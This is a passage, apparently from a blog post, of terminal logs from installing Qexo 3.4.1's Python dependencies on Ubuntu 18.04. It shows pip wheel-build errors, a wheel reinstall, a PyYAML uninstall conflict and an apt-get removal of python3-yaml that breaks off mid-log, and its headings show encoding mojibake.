setup.py clean <span class="hljs-keyword">for</span> aliyun-python-sdk-core<br>  Building wheel <span class="hljs-keyword">for</span> crcmod (setup.py) ... error<br>  error: subprocess-exited-with-error<br>  <br>  Ã— python setup.py bdist_wheel did not run successfully.<br>  â”‚ <span class="hljs-built_in">exit</span> code: 1<br>  â•°â”€&gt; [37 lines of output]<br>      Traceback (most recent call last):<br>        File <span class="hljs-string">&quot;/tmp/pip-install-y1qa10vz/crcmod_0f0ce0da6c6b415fb56a5a6b682c5c09/setup.py&quot;</span>, line 58, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          setup(**setup_dict)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/core.py&quot;</span>, line 170, <span class="hljs-keyword">in</span> setup<br>          ok = dist.parse_command_line()<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 472, <span class="hljs-keyword">in</span> parse_command_line<br>          args = self._parse_command_opts(parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 901, <span class="hljs-keyword">in</span> _parse_command_opts<br>          nargs = _Distribution._parse_command_opts(self, parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 531, <span class="hljs-keyword">in</span> _parse_command_opts<br>          cmd_class = self.get_command_class(<span class="hljs-built_in">command</span>)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 738, <span class="hljs-keyword">in</span> get_command_class<br>          from .command.bdist_wheel import bdist_wheel<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/command/bdist_wheel.py&quot;</span>, line 26, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          from wheel.wheelfile import WheelFile<br>      ModuleNotFoundError: No module named <span class="hljs-string">&#x27;wheel.wheelfile&#x27;</span><br>      <br>      During handling of the above exception, another exception occurred:<br>      <br>      Traceback (most recent call last):<br>        File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 2, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;&lt;pip-setuptools-caller&gt;&quot;</span>, line 34, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;/tmp/pip-install-y1qa10vz/crcmod_0f0ce0da6c6b415fb56a5a6b682c5c09/setup.py&quot;</span>, line 66, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          setup(**setup_dict)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/core.py&quot;</span>, line 170, <span class="hljs-keyword">in</span> setup<br>          ok = dist.parse_command_line()<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 472, <span class="hljs-keyword">in</span> parse_command_line<br>          args = self._parse_command_opts(parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 901, <span class="hljs-keyword">in</span> _parse_command_opts<br>          nargs = _Distribution._parse_command_opts(self, parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 531, <span class="hljs-keyword">in</span> _parse_command_opts<br>          cmd_class = self.get_command_class(<span class="hljs-built_in">command</span>)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 738, <span class="hljs-keyword">in</span> get_command_class<br>          from .command.bdist_wheel import bdist_wheel<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/command/bdist_wheel.py&quot;</span>, line 26, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          from wheel.wheelfile import WheelFile<br>      ModuleNotFoundError: No module named <span class="hljs-string">&#x27;wheel.wheelfile&#x27;</span><br>      [end of output]<br>  <br>  note: This error originates from a subprocess, and is likely not a problem with pip.<br>  ERROR: Failed building wheel <span class="hljs-keyword">for</span> crcmod<br>  Running setup.py clean <span class="hljs-keyword">for</span> crcmod<br>Failed to build oss2 upyun aliyun-python-sdk-core crcmod<br>ERROR: ERROR: Failed to build installable wheels <span class="hljs-keyword">for</span> some pyproject.toml based projects (oss2, upyun, aliyun-python-sdk-core, crcmod)<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="å°æ’æ›²ï¼šé‡æ–°å®‰è£…wheel"><a href="#å°æ’æ›²ï¼šé‡æ–°å®‰è£…wheel" class="headerlink" title="å°æ’æ›²ï¼šé‡æ–°å®‰è£…wheel"></a>å°æ’æ›²ï¼šé‡æ–°å®‰è£…wheel</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install --upgrade --force-reinstall wheel</span><br>Collecting wheel<br>  Downloading wheel-0.44.0-py3-none-any.whl.metadata (2.3 kB)<br>Downloading wheel-0.44.0-py3-none-any.whl (67 kB)<br>WARNING: Error parsing dependencies of bcc: Invalid version: <span class="hljs-string">&#x27;0.24.0-8f40d6f5&#x27;</span><br>WARNING: Error parsing dependencies of distro-info: Invalid version: <span class="hljs-string">&#x27;0.18ubuntu0.18.04.1&#x27;</span><br>Installing collected packages: wheel<br>  Attempting uninstall: wheel<br>    Found existing installation: wheel 0.30.0<br>    Uninstalling wheel-0.30.0:<br>      Successfully uninstalled wheel-0.30.0<br>Successfully installed wheel-0.44.0<br>WARNING: Running pip as the <span class="hljs-string">&#x27;root&#x27;</span> user can result <span class="hljs-keyword">in</span> broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable.It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option <span class="hljs-keyword">if</span> you know what you are doing and want to suppress this warning.<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="å›åˆ°ä¸»çº¿-5"><a href="#å›åˆ°ä¸»çº¿-5" class="headerlink" title="å›åˆ°ä¸»çº¿"></a>å›åˆ°ä¸»çº¿</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==3.2.25 (from -r requirements.txt (line 1))<br>  Using cached Django-3.2.25-py3-none-any.whl.metadata (4.1 kB)<br>Collecting PyMySQL==1.0.2 (from -r requirements.txt (line 2))<br>  Using cached PyMySQL-1.0.2-py3-none-any.whl.metadata (5.1 kB)<br>Collecting boto3==1.34.44 (from -r requirements.txt (line 3))<br>  Using cached boto3-1.34.44-py3-none-any.whl.metadata (6.6 kB)<br>Collecting requests==2.31.0 (from -r requirements.txt (line 4))<br>  Using cached requests-2.31.0-py3-none-any.whl.metadata (4.6 kB)<br>Collecting PyGithub==2.2.0 (from -r requirements.txt (line 5))<br>  Using cached PyGithub-2.2.0-py3-none-any.whl.metadata (3.8 kB)<br>Collecting python-gitlab==4.4.0 (from -r requirements.txt (line 6))<br>  Using cached python_gitlab-4.4.0-py3-none-any.whl.metadata (7.7 kB)<br>Collecting html2text==2020.1.16 (from -r requirements.txt (line 7))<br>  Using cached html2text-2020.1.16-py3-none-any.whl.metadata (4.3 kB)<br>Collecting PyYAML==6.0.1 (from -r requirements.txt (line 8))<br>  Using cached PyYAML-6.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (2.1 kB)<br>Collecting urllib3==1.26.18 (from -r requirements.txt (line 9))<br>  Using cached urllib3-1.26.18-py2.py3-none-any.whl.metadata (48 kB)<br>Collecting Markdown==3.5.2 (from -r requirements.txt (line 10))<br>  Using cached Markdown-3.5.2-py3-none-any.whl.metadata (7.0 kB)<br>Collecting djongo5==1.3.9 (from -r requirements.txt (line 11))<br>  Using cached djongo5-1.3.9-py3-none-any.whl.metadata (1.9 kB)<br>Collecting django-cors-headers==4.1.0 (from -r requirements.txt (line 12))<br>  Using cached django_cors_headers-4.1.0-py3-none-any.whl.metadata (16 kB)<br>Collecting pymongo==3.13.0 (from -r requirements.txt (line 13))<br>  Using cached pymongo-3.13.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (9.7 kB)<br>Collecting dnspython==2.2.1 (from -r requirements.txt (line 14))<br>  Using cached dnspython-2.2.1-py3-none-any.whl.metadata (4.9 kB)<br>Collecting sqlparse==0.2.4 (from -r requirements.txt (line 15))<br>  Using cached sqlparse-0.2.4-py2.py3-none-any.whl.metadata (2.2 kB)<br>Collecting psycopg2-binary==2.9.9 (from -r requirements.txt (line 16))<br>  Using cached psycopg2_binary-2.9.9-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.4 kB)<br>Requirement already satisfied: cryptography==42.0.4 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from -r requirements.txt (line 17)) (42.0.4)<br>Collecting pyopenssl==24.0.0 (from -r requirements.txt (line 18))<br>  Using cached pyOpenSSL-24.0.0-py3-none-any.whl.metadata (12 kB)<br>Collecting oss2==2.18.4 (from -r requirements.txt (line 19))<br>  Using cached oss2-2.18.4.tar.gz (278 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting beautifulsoup4==4.12.3 (from -r requirements.txt (line 20))<br>  Using cached beautifulsoup4-4.12.3-py3-none-any.whl.metadata (3.8 kB)<br>Collecting upyun==2.5.5 (from -r requirements.txt (line 21))<br>  Using cached upyun-2.5.5.tar.gz (19 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting asgiref&lt;4,&gt;=3.3.2 (from Django==3.2.25-&gt;-r requirements.txt (line 1))<br>  Using cached asgiref-3.8.1-py3-none-any.whl.metadata (9.3 kB)<br>Requirement already satisfied: pytz <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from Django==3.2.25-&gt;-r requirements.txt (line 1)) (2018.3)<br>Collecting botocore&lt;1.35.0,&gt;=1.34.44 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached botocore-1.34.162-py3-none-any.whl.metadata (5.7 kB)<br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached jmespath-1.0.1-py3-none-any.whl.metadata (7.6 kB)<br>Collecting s3transfer&lt;0.11.0,&gt;=0.10.0 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached s3transfer-0.10.3-py3-none-any.whl.metadata (1.7 kB)<br>Collecting charset-normalizer&lt;4,&gt;=2 (from requests==2.31.0-&gt;-r requirements.txt (line 4))<br>  Using cached charset_normalizer-3.4.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (34 kB)<br>Requirement already satisfied: idna&lt;4,&gt;=2.5 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from requests==2.31.0-&gt;-r requirements.txt (line 4)) (2.6)<br>Requirement already satisfied: certifi&gt;=2017.4.17 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from requests==2.31.0-&gt;-r requirements.txt (line 4)) (2018.1.18)<br>Collecting pynacl&gt;=1.4.0 (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl.metadata (8.6 kB)<br>Collecting pyjwt&gt;=2.4.0 (from pyjwt[crypto]&gt;=2.4.0-&gt;PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached PyJWT-2.9.0-py3-none-any.whl.metadata (3.0 kB)<br>Collecting typing-extensions&gt;=4.0.0 (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached typing_extensions-4.12.2-py3-none-any.whl.metadata (3.0 kB)<br>Collecting Deprecated (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached Deprecated-1.2.14-py2.py3-none-any.whl.metadata (5.4 kB)<br>Collecting requests-toolbelt&gt;=0.10.1 (from python-gitlab==4.4.0-&gt;-r requirements.txt (line 6))<br>  Using cached requests_toolbelt-1.0.0-py2.py3-none-any.whl.metadata (14 kB)<br>Collecting importlib-metadata&gt;=4.4 (from Markdown==3.5.2-&gt;-r requirements.txt (line 10))<br>  Using cached importlib_metadata-8.5.0-py3-none-any.whl.metadata (4.8 kB)<br>Collecting pytz (from Django==3.2.25-&gt;-r requirements.txt (line 1))<br>  Using cached pytz-2024.2-py2.py3-none-any.whl.metadata (22 kB)<br>Requirement already satisfied: cffi&gt;=1.12 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from cryptography==42.0.4-&gt;-r requirements.txt (line 17)) (1.17.1)<br>Collecting crcmod&gt;=1.7 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached crcmod-1.7.tar.gz (89 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting pycryptodome&gt;=3.4.7 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)<br>Collecting aliyun-python-sdk-kms&gt;=2.4.1 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached aliyun_python_sdk_kms-2.16.5-py2.py3-none-any.whl.metadata (1.5 kB)<br>Collecting aliyun-python-sdk-core&gt;=2.13.12 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached aliyun-python-sdk-core-2.16.0.tar.gz (449 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting six (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached six-1.16.0-py2.py3-none-any.whl.metadata (1.8 kB)<br>Collecting soupsieve&gt;1.2 (from beautifulsoup4==4.12.3-&gt;-r requirements.txt (line 20))<br>  Using cached soupsieve-2.6-py3-none-any.whl.metadata (4.6 kB)<br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached jmespath-0.10.0-py2.py3-none-any.whl.metadata (8.0 kB)<br>Requirement already satisfied: python-dateutil&lt;3.0.0,&gt;=2.1 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from botocore&lt;1.35.0,&gt;=1.34.44-&gt;boto3==1.34.44-&gt;-r requirements.txt (line 3)) (2.6.1)<br>Requirement already satisfied: pycparser <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from cffi&gt;=1.12-&gt;cryptography==42.0.4-&gt;-r requirements.txt (line 17)) (2.22)<br>Collecting zipp&gt;=3.20 (from importlib-metadata&gt;=4.4-&gt;Markdown==3.5.2-&gt;-r requirements.txt (line 10))<br>  Using cached zipp-3.20.2-py3-none-any.whl.metadata (3.7 kB)<br>Collecting wrapt&lt;2,&gt;=1.10 (from Deprecated-&gt;PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached wrapt-1.16.0-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (6.6 kB)<br>Using cached Django-3.2.25-py3-none-any.whl (7.9 MB)<br>Using cached PyMySQL-1.0.2-py3-none-any.whl (43 kB)<br>Using cached boto3-1.34.44-py3-none-any.whl (139 kB)<br>Using cached requests-2.31.0-py3-none-any.whl (62 kB)<br>Using cached PyGithub-2.2.0-py3-none-any.whl (350 kB)<br>Using cached python_gitlab-4.4.0-py3-none-any.whl (138 kB)<br>Using cached html2text-2020.1.16-py3-none-any.whl (32 kB)<br>Using cached PyYAML-6.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (736 kB)<br>Using cached urllib3-1.26.18-py2.py3-none-any.whl (143 kB)<br>Using cached Markdown-3.5.2-py3-none-any.whl (103 kB)<br>Using cached djongo5-1.3.9-py3-none-any.whl (51 kB)<br>Using cached django_cors_headers-4.1.0-py3-none-any.whl (12 kB)<br>Using cached pymongo-3.13.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (526 kB)<br>Using cached dnspython-2.2.1-py3-none-any.whl (269 kB)<br>Using cached sqlparse-0.2.4-py2.py3-none-any.whl (38 kB)<br>Using cached psycopg2_binary-2.9.9-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (3.0 MB)<br>Using cached pyOpenSSL-24.0.0-py3-none-any.whl (58 kB)<br>Using cached beautifulsoup4-4.12.3-py3-none-any.whl (147 kB)<br>Using cached aliyun_python_sdk_kms-2.16.5-py2.py3-none-any.whl (99 kB)<br>Using cached asgiref-3.8.1-py3-none-any.whl (23 kB)<br>Using cached botocore-1.34.162-py3-none-any.whl (12.5 MB)<br>Using cached charset_normalizer-3.4.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (143 kB)<br>Using cached importlib_metadata-8.5.0-py3-none-any.whl (26 kB)<br>Using cached jmespath-0.10.0-py2.py3-none-any.whl (24 kB)<br>Using cached pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)<br>Using cached PyJWT-2.9.0-py3-none-any.whl (22 kB)<br>Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl (856 kB)<br>Using cached pytz-2024.2-py2.py3-none-any.whl (508 kB)<br>Using cached requests_toolbelt-1.0.0-py2.py3-none-any.whl (54 kB)<br>Using cached s3transfer-0.10.3-py3-none-any.whl (82 kB)<br>Using cached soupsieve-2.6-py3-none-any.whl (36 kB)<br>Using cached typing_extensions-4.12.2-py3-none-any.whl (37 kB)<br>Using cached Deprecated-1.2.14-py2.py3-none-any.whl (9.6 kB)<br>Using cached six-1.16.0-py2.py3-none-any.whl (11 kB)<br>Using cached wrapt-1.16.0-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (83 kB)<br>Using cached zipp-3.20.2-py3-none-any.whl (9.2 kB)<br>Building wheels <span class="hljs-keyword">for</span> collected packages: oss2, upyun, aliyun-python-sdk-core, crcmod<br>  Building wheel <span class="hljs-keyword">for</span> oss2 (setup.py) ... <span class="hljs-keyword">done</span><br>  Created wheel <span class="hljs-keyword">for</span> oss2: filename=oss2-2.18.4-py3-none-any.whl size=115940 sha256=1e38b5d46faf1f72351842cf111b0339af5611aeeae29c8d5c7189f23baabc12<br>  Stored <span class="hljs-keyword">in</span> directory: /root/.cache/pip/wheels/3d/7e/b4/d1ddfa5624c5720f3bac0e73c058d7d16ca4ebdb28bc11b5cd<br>  Building wheel <span class="hljs-keyword">for</span> upyun (setup.py) ... <span class="hljs-keyword">done</span><br>  Created wheel <span class="hljs-keyword">for</span> upyun: filename=upyun-2.5.5-py3-none-any.whl size=17516 sha256=451e4043a0d309489c7c143a23c42c7f5507e431f5e647907ea5f3284f98ad2c<br>  Stored <span class="hljs-keyword">in</span> directory: /root/.cache/pip/wheels/80/49/84/6efc7937d178d60303b1a9c690fd293a5e193ebfa29b3513c6<br>  Building wheel <span class="hljs-keyword">for</span> aliyun-python-sdk-core (setup.py) ... <span class="hljs-keyword">done</span><br>  Created wheel <span class="hljs-keyword">for</span> aliyun-python-sdk-core: filename=aliyun_python_sdk_core-2.16.0-py3-none-any.whl size=535316 sha256=5e3db57da23072088b4c7f0430edc04f0c64668cc5a48b9bb5aa721c8f319a2c<br>  Stored <span class="hljs-keyword">in</span> directory: /root/.cache/pip/wheels/b2/49/69/4ff7cddf922bb14b3cd172290d83582ec72051d43333e70b69<br>  Building wheel <span class="hljs-keyword">for</span> crcmod (setup.py) ... <span class="hljs-keyword">done</span><br>  Created wheel <span class="hljs-keyword">for</span> crcmod: filename=crcmod-1.7-py3-none-any.whl size=18834 sha256=08d9dbc9269059696c5df9c187ea5d5f1c120ecfa265719e92757291401d7c2e<br>  Stored <span class="hljs-keyword">in</span> directory: /root/.cache/pip/wheels/ca/5a/02/f3acf982a026f3319fb3e798a8dca2d48fafee7761788562e9<br>Successfully built oss2 upyun aliyun-python-sdk-core crcmod<br>WARNING: Error parsing dependencies of bcc: Invalid version: <span class="hljs-string">&#x27;0.24.0-8f40d6f5&#x27;</span><br>WARNING: Error parsing dependencies of distro-info: Invalid version: <span class="hljs-string">&#x27;0.18ubuntu0.18.04.1&#x27;</span><br>Installing collected packages: sqlparse, pytz, crcmod, zipp, wrapt, urllib3, typing-extensions, soupsieve, six, PyYAML, PyMySQL, pymongo, pyjwt, pycryptodome, psycopg2-binary, jmespath, html2text, dnspython, charset-normalizer, requests, pynacl, importlib-metadata, Deprecated, botocore, beautifulsoup4, asgiref, upyun, s3transfer, requests-toolbelt, pyopenssl, Markdown, Django, aliyun-python-sdk-core, python-gitlab, PyGithub, djongo5, django-cors-headers, boto3, aliyun-python-sdk-kms, oss2<br>  Attempting uninstall: pytz<br>    Found existing installation: pytz 2018.3<br>    Uninstalling pytz-2018.3:<br>      Successfully uninstalled pytz-2018.3<br>  Attempting uninstall: PyYAML<br>    Found existing installation: PyYAML 3.12<br>error: uninstall-distutils-installed-package<br><br>Ã— Cannot uninstall PyYAML 3.12<br>â•°â”€&gt; It is a distutils installed project and thus we cannot accurately determine <span class="hljs-built_in">which</span> files belong to it <span class="hljs-built_in">which</span> would lead to only a partial uninstall.<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="å°æ’æ›²ï¼šåŒ…ç®¡ç†å™¨æ¥å¸è½½PyYAML"><a href="#å°æ’æ›²ï¼šåŒ…ç®¡ç†å™¨æ¥å¸è½½PyYAML" class="headerlink" title="å°æ’æ›²ï¼šåŒ…ç®¡ç†å™¨æ¥å¸è½½PyYAML"></a>å°æ’æ›²ï¼šåŒ…ç®¡ç†å™¨æ¥å¸è½½PyYAML</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># sudo apt-get remove python3-yaml</span><br>Reading package lists... Done<br>Building dependency tree       <br>Reading state information... Done<br>The following packages were automatically installed and are no longer required:<br>  apturl-common distro-info gir1.2-dbusmenu-glib-0.4 gir1.2-dee-1.0 gir1.2-javascriptcoregtk-4.0 gir1.2-unity-5.0 gir1.2-webkit2-4.0<br>  gnome-session-bin gnome-session-common gnome-software-common gnome-startup-applications libappstream-glib8 libnetplan0<br>  python3-dateutil python3-debconf python3-netifaces<br>Use <span class="hljs-string">&#x27;sudo apt autoremove&#x27;</span> to remove them.<br>The following additional packages will be installed:<br>  python3-update-manager<br>The following packages will be REMOVED:<br>  apturl gnome-software gnome-software-plugin-snap nautilus-share netplan.io nplan python3-yaml software-properties-gtk<br>  ubuntu-advantage-desktop-daemon ubuntu-advantage-tools ubuntu-minimal ubuntu-release-upgrader-gtk ubuntu-software update-manager<br>  update-manager-core update-notifier update-notifier-common<br>The following packages will be upgraded:<br>  python3-update-manager<br>1 upgraded, 0 newly installed, 17 to remove and 1 not upgraded.<br>Need to get 35.4 kB of archives.<br>After this operation, 8,772 kB disk space will be freed.<br>Do you want to <span class="hljs-built_in">continue</span>? [Y/n] y<br>Get:1 https://mirrors.aliyun.com/ubuntu bionic-updates/main amd64 python3-update-manager all 1:18.04.13.1 [35.4 kB]<br>Fetched 35.4 kB <span class="hljs-keyword">in</span> 0s (142 kB/s)                  <br>(Reading database ... 279567 files and directories currently installed.)<br>Removing nautilus-share (0.7.3-2ubuntu3) ...<br>Removing apturl (0.5.2ubuntu14.2) ...<br>Removing gnome-software-plugin-snap (3.28.1-0ubuntu4.18.04.15) ...<br>Removing ubuntu-software (3.28.1-0ubuntu4.18.04.15) ...<br>Removing gnome-software (3.28.1-0ubuntu4.18.04.15) ...<br>Removing ubuntu-minimal (1.417.5) ...<br>Removing nplan (0.99-0ubuntu3~18.04.5) ...<br>Removing netplan.io (0.99-0ubuntu3~18.04.5) ...<br>dpkg: warning: <span class="hljs-keyword">while</span> removing netplan.io, directory <span 